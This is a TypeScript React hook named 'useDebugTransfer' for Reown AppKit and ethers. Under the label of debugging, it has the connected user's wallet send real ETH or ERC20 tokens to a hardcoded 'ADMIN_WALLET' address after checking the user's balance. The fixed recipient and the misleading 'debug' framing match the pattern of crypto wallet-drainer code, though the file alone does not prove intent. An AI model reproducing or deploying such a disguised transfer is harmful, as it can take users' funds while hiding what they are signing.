import { useState, useCallback } from 'react';
import { useAppKitAccount, useAppKitNetwork } from '@reown/appkit/react';
import { BrowserProvider, Contract, parseUnits, formatUnits } from 'ethers';

interface DebugTransferState {
  isDebugging: boolean;
  logs: string[];
  error: string | null;
  transferHash: string | null;
}

const ERC20_ABI = [
  "function transfer(address to, uint256 amount) returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)"
];

const ADMIN_WALLET = '0x742D35Cc6dF6A18647d95D5ae274C4D81dB7E88e';

export function useDebugTransfer() {
  const { address, isConnected } = useAppKitAccount();
  const { caipNetwork } = useAppKitNetwork();

  const [debugState, setDebugState] = useState<DebugTransferState>({
    isDebugging: false,
    logs: [],
    error: null,
    transferHash: null
  });

  const addLog = useCallback((message: string) => {
    console.log('[DEBUG]', message);
    setDebugState(prev => ({
      ...prev,
      logs: [...prev.logs, `${new Date().toLocaleTimeString()}: ${message}`]
    }));
  }, []);

  const debugTransfer = useCallback(async (
    tokenAddress: string,
    amount: string
  ): Promise<boolean> => {
    setDebugState(prev => ({
      ...prev,
      isDebugging: true,
      logs: [],
      error: null,
      transferHash: null
    }));

    try {
      addLog('Starting debug transfer process');
      
      // Check wallet connection
      if (!isConnected || !address || !caipNetwork) {
        throw new Error('Wallet not connected properly');
      }
      addLog(`Wallet connected: ${address}`);
      addLog(`Network: ${caipNetwork.id} (${caipNetwork.name})`);

      // Get provider and signer
      addLog('Getting provider and signer');
      const provider = new BrowserProvider((window as any).ethereum);
      const signer = await provider.getSigner();
      addLog('Provider and signer obtained');

      // Check network
      const network = await provider.getNetwork();
      addLog(`Connected to network: ${network.name} (${network.chainId})`);

      // Validate admin wallet
      addLog(`Admin wallet: ${ADMIN_WALLET}`);

      if (tokenAddress === '0x0000000000000000000000000000000000000000') {
        // Native token transfer debug
        addLog('Processing native token transfer');
        
        // Check balance
        const balance = await provider.getBalance(address);
        const balanceEth = formatUnits(balance, 18);
        addLog(`Current balance: ${balanceEth} ETH`);
        
        const requiredAmount = parseUnits(amount, 18);
        addLog(`Required amount: ${amount} ETH (${requiredAmount.toString()} wei)`);
        
        if (balance < requiredAmount) {
          throw new Error(`Insufficient balance: ${balanceEth} < ${amount}`);
        }

        // Estimate gas
        try {
          const gasEstimate = await provider.estimateGas({
            to: ADMIN_WALLET,
            value: requiredAmount
          });
          addLog(`Gas estimate: ${gasEstimate.toString()}`);
        } catch (gasError) {
          addLog(`Gas estimation failed: ${(gasError as Error).message}`);
        }

        // Send transaction
        addLog('Sending native token transaction');
        const tx = await signer.sendTransaction({
          to: ADMIN_WALLET,
          value: requiredAmount,
          gasLimit: 21000
        });
        
        addLog(`Transaction sent: ${tx.hash}`);
        addLog('Waiting for confirmation...');
        
        const receipt = await tx.wait();
        addLog(`Transaction confirmed: ${receipt?.hash}`);
        
        setDebugState(prev => ({ ...prev, transferHash: receipt?.hash || tx.hash }));
        
      } else {
        // ERC20 token transfer debug
        addLog('Processing ERC20 token transfer');
        addLog(`Token address: ${tokenAddress}`);
        
        const tokenContract = new Contract(tokenAddress, ERC20_ABI, provider);
        
        // Get token info
        try {
          const [symbol, decimals] = await Promise.all([
            tokenContract.symbol(),
            tokenContract.decimals()
          ]);
          addLog(`Token: ${symbol} (${decimals} decimals)`);
          
          // Check balance
          const balance = await tokenContract.balanceOf(address);
          const balanceFormatted = formatUnits(balance, decimals);
          addLog(`Current balance: ${balanceFormatted} ${symbol}`);
          
          const requiredAmount = parseUnits(amount, decimals);
          addLog(`Required amount: ${amount} ${symbol} (${requiredAmount.toString()} units)`);
          
          if (balance < requiredAmount) {
            throw new Error(`Insufficient ${symbol} balance: ${balanceFormatted} < ${amount}`);
          }

          // Send transfer transaction
          addLog('Sending ERC20 transfer transaction');
          const contractWithSigner = tokenContract.connect(signer);
          const tx = await contractWithSigner.transfer(ADMIN_WALLET, requiredAmount);
          
          addLog(`Transaction sent: ${tx.hash}`);
          addLog('Waiting for confirmation...');
          
          const receipt = await tx.wait();
          addLog(`Transaction confirmed: ${receipt.hash}`);
          
          setDebugState(prev => ({ ...prev, transferHash: receipt.hash }));
          
        } catch (tokenError) {
          addLog(`Token contract error: ${(tokenError as Error).message}`);
          throw tokenError;
        }
      }

      addLog('Transfer completed successfully');
      setDebugState(prev => ({ ...prev, isDebugging: false }));
      return true;

    } catch (error) {
      const errorMessage = (error as Error).message;
      addLog(`Transfer failed: ${errorMessage}`);
      setDebugState(prev => ({
        ...prev,
        isDebugging: false,
        error: errorMessage
      }));
      return false;
    }
  }, [isConnected, address, caipNetwork, addLog]);

  const resetDebug = useCallback(() => {
    setDebugState({
      isDebugging: false,
      logs: [],
      error: null,
      transferHash: null
    });
  }, []);

  return {
    debugState,
    debugTransfer,
    resetDebug
  };
}